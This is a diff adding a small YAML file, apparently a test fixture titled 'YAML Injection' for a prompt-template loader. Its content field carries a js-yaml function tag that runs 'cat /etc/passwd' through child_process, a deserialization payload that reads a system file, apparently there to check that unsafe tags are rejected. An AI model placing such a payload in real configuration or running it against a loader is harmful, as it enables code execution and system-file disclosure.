@@ -1,0 +1,9 @@
+name: "YAML Injection"
+content: !<tag:yaml.org,2002:js/function> |
+  function(){
+    return require('child_process').execSync('cat /etc/passwd').toString();
+  }
+input_variables:
+  dummy:
+    type: "string"
+    description: "Dummy variable"
